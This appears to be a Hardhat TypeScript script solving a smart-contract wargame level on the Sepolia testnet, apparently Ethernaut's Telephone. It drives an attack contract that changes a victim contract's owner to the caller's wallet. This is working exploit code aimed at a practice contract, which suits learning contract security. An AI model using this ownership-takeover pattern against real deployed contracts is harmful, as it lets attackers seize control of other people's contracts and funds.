//To more info go to /contracts/03CoinFlipAttack.sol
import { ethers } from "hardhat";
import { ABI, ABI_ATTACK } from "./variables/04/ABIS";
import dotenv from "dotenv";

dotenv.config();

// const CONTRACT_ADDS = process.env.TEST_ADDR_ONE;
// const CONTRACT_ADDS_ATTACK = process.env.TEST_ADDR_TWO;

const CONTRACT_ADDS = process.env.TEST_ADDR_ONE;
const CONTRACT_ADDS_ATTACK = process.env.TELEPHONE_ADDRS_ATTACK;

const PRIVATE_KEY = process.env.PRIVATE_KEY as string;
// const PRIVATE_KEY = process.env.PRIVATE_KEY_TEST_TWO as string;

if (!CONTRACT_ADDS) {
  throw new Error(
    "You forgot to pass the adders for the attack contract, in the env file"
  );
}

// This is for testing
// const url = "http://127.0.0.1:8545/"
// This is for production
const url = "wss://ethereum-sepolia-rpc.publicnode.com";
const provider = ethers.getDefaultProvider(url);
//
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

const contract = new ethers.Contract(CONTRACT_ADDS, ABI, signer);
const contract_att = new ethers.Contract(
  CONTRACT_ADDS_ATTACK,
  ABI_ATTACK,
  signer
);

const getOwner = async () => {
  const owner = await contract.owner();
  console.log("the owner of the contract is:", owner);
};

const getVictim = async () => {
  const victim = await contract_att.victim_addres();
  console.log("the address of the victim is: ", victim);
};

const changeOwner = async () => {
  const newOwner = await signer.getAddress();
  await contract_att.send(newOwner);
};

const check = async () => {
  const x = await signer.getAddress();
  console.log("adders", x);
};

const main = async () => {
  await changeOwner();
  // await getOwner();
};
// check();
main();
// getVictim();
